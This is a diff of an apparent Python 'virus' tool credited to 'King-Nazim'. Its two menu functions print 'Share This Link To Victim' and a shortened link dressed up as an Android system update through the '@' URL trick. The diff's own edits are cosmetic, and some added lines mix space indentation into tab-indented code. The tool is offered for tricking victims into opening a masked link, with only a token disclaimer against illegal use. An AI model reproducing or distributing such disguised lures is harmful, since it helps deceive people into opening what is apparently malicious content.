@@ -22,9 +22,10 @@ def power_virus():
 	print("High Power Virus Made By King-Nazim")
 	print("")
 	print("Share This Link To Victim")
+        print("")
 	print("------------------------------------------")
 	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
-	print('''------------------------------------------''')
+	print("")
 	slowprint('''Don't Use This App For Any Kind Of illegal Activites''')
 
 def low_virus():
@@ -40,9 +41,10 @@ def low_virus():
 	print("Low Power Virus Made By King-Nazim")
 	print("")
 	print("Share This Link To Victim")
+        print("")
 	print("--------------------------------------------")
 	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
-	print('''--------------------------------------------''')
+	print("")
 	slowprint('''Don't Use This App For Any Kind Of illegal Activites''')
 
 
@@ -69,7 +71,7 @@ if choos == '1':
         power_virus()
 if choos == '2':
         low_virus()
-else:print("Invalid Option")
+else:print("")
 
 
 
